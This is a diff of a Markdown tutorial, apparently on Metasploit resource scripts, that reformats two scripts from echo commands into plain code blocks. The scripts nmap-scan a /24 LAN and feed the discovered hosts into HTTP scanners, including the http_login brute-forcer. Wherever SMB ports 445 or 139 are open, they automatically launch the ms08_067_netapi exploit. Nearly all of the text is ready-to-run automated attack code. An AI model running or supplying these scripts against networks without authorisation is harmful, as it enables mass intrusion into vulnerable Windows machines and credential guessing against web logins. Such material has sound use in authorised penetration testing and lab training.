@@ -276,30 +276,32 @@
 </ruby>
 ```
 
+     `[run]` msfconsole -r /root/template.rc
+
 <br /><br />
 
 - **Scan local lan with nmap and run auxiliary(s)::**`[http_title.rc]`<br />
 
-      touch http_title.rc
+```
+db_nmap -sV -Pn -T4 -p 80 --open --reason 192.168.1.0/24
+services
 
-        echo 'db_nmap -sV -Pn -T4 -p 80 --open --reason 192.168.1.0/24' > http_title.rc
-        echo 'services' >> http_title.rc
-        echo "" >> http_title.rc
-        echo '   <ruby>' >> http_title.rc
-        echo "     xhost = framework.db.hosts.map(&:address).join(' ')" >> http_title.rc
-        echo '           run_single("setg RHOSTS #{xhost}")' >> http_title.rc
-        echo '           print_good("###### Running ruby code inside resource files ######")' >> http_title.rc
-        echo '           run_single("use auxiliary/scanner/http/title")' >> http_title.rc
-        echo '           run_single("exploit")' >> http_title.rc
-        echo '           print_good("######### dir_scanner auxiliary #########")' >> http_title.rc
-        echo '           run_single("use auxiliary/scanner/http/dir_scanner")' >> http_title.rc
-        echo '           run_single("exploit")' >> http_title.rc
-        echo '           print_good("######### http_login auxiliary #########")' >> http_title.rc
-        echo '           run_single("use auxiliary/scanner/http/http_login")' >> http_title.rc
-        echo '           run_single("exploit")' >> http_title.rc
-        echo '   </ruby>' >> http_title.rc
-        echo "" >> http_title.rc
-        echo 'unsetg RHOSTS' >> http_title.rc
+   <ruby>
+     xhost = framework.db.hosts.map(&:address).join(' ')
+           run_single("setg RHOSTS #{xhost}")
+           print_good("###### Running ruby code inside resource files ######")
+           run_single("use auxiliary/scanner/http/title")
+           run_single("exploit")
+           print_good("######### dir_scanner auxiliary #########")
+           run_single("use auxiliary/scanner/http/dir_scanner")
+           run_single("exploit")
+           print_good("######### http_login auxiliary #########")
+           run_single("use auxiliary/scanner/http/http_login")
+           run_single("exploit")
+   </ruby>
+
+unsetg RHOSTS
+```
 
      `[run]` msfconsole -r /root/http_title.rc
 
@@ -309,49 +311,47 @@
 
 - **Run auxiliary/exploit modules based on database (targets) ports found::**`[exploiter.rc]`<br />
 
-<br />
+```
+db_nmap -sV -Pn -T4 -p 80,445,139 --open --reason 192.168.1.0/24
+services
 
-      touch exploiter.rc
+   <ruby>
+      xhost = framework.db.hosts.map(&:address).join(' ')
+      xport = framework.db.services.map(&:port).join(' ')
+      run_single("setg RHOSTS #{xhost}")
 
-        echo 'db_nmap -sV -Pn -T4 -p 80,445,139 --open --reason 192.168.1.0/24' > exploiter.rc
-        echo 'services' >> exploiter.rc
-        echo "" >> exploiter.rc
-        echo '   <ruby>' >> exploiter.rc
-        echo "      xhost = framework.db.hosts.map(&:address).join(' ')" >> exploiter.rc
-        echo "      xport = framework.db.services.map(&:port).join(' ')" >> exploiter.rc
-        echo '      run_single("setg RHOSTS #{xhost}")' >> exploiter.rc
-        echo "" >> exploiter.rc
-        echo '         if xport =~ /80/i' >> exploiter.rc
-        echo '              print_status("## Target port: 80 http found")' >> exploiter.rc
-        echo '              print_good("## Running port 80 auxiliary/exploits.")' >> exploiter.rc
-        echo '              run_single("use auxiliary/scanner/http/title")' >> exploiter.rc
-        echo '              run_single("exploit")' >> exploiter.rc
-        echo '              print_good("######### dir_scanner auxiliary #########")' >> exploiter.rc
-        echo '              run_single("use auxiliary/scanner/http/dir_scanner")' >> exploiter.rc
-        echo '              run_single("exploit")' >> exploiter.rc
-        echo '              print_good("######### http_login auxiliary #########")' >> exploiter.rc
-        echo '              run_single("use auxiliary/scanner/http/http_login")' >> exploiter.rc
-        echo '              run_single("exploit")' >> exploiter.rc
-        echo '         end' >> exploiter.rc
-        echo "" >> exploiter.rc
-        echo '         if xport =~ /445/i' >> exploiter.rc
-        echo '              print_status("## Target port: 445 https found")' >> exploiter.rc
-        echo '              print_good("## Running port 445 auxiliary/exploits.")' >> exploiter.rc
-        echo '              run_single("use exploit/windows/smb/ms08_067_netapi")' >> exploiter.rc
-        echo '              run_single("exploit")' >> exploiter.rc
-        echo '         end' >> exploiter.rc
-        echo "" >> exploiter.rc
-        echo '         if xport =~ /139/i' >> exploiter.rc
-        echo '              print_status("## Target port: 139 smb found")' >> exploiter.rc
-        echo '              print_good("## Running port 139 auxiliary/exploits.")' >> exploiter.rc
-        echo '              run_single("use exploit/windows/smb/ms08_067_netapi")' >> exploiter.rc
-        echo '              run_single("exploit")' >> exploiter.rc
-        echo '         end' >> exploiter.rc
-        echo '   </ruby>' >> exploiter.rc
-        echo "" >> exploiter.rc
-        echo 'unsetg RHOSTS' >> exploiter.rc
+         if xport =~ /80/i
+              print_status("## Target port: 80 http found")
+              print_good("## Running port 80 auxiliary/exploits.")
+              run_single("use auxiliary/scanner/http/title")
+              run_single("exploit")
+              print_good("######### dir_scanner auxiliary #########")
+              run_single("use auxiliary/scanner/http/dir_scanner")
+              run_single("exploit")
+              print_good("######### http_login auxiliary #########")
+              run_single("use auxiliary/scanner/http/http_login")
+              run_single("exploit")
+         end
 
-<br />    `[run]` msfconsole -r /root/exploiter.rc
+         if xport =~ /445/i
+              print_status("## Target port: 445 https found")
+              print_good("## Running port 445 auxiliary/exploits.")
+              run_single("use exploit/windows/smb/ms08_067_netapi")
+              run_single("exploit")
+         end
+
+         if xport =~ /139/i
+              print_status("## Target port: 139 smb found")
+              print_good("## Running port 139 auxiliary/exploits.")
+              run_single("use exploit/windows/smb/ms08_067_netapi")
+              run_single("exploit")
+         end
+   </ruby>
+
+unsetg RHOSTS
+```
+
+    `[run]` msfconsole -r /root/exploiter.rc
 
 <br /><br />
 
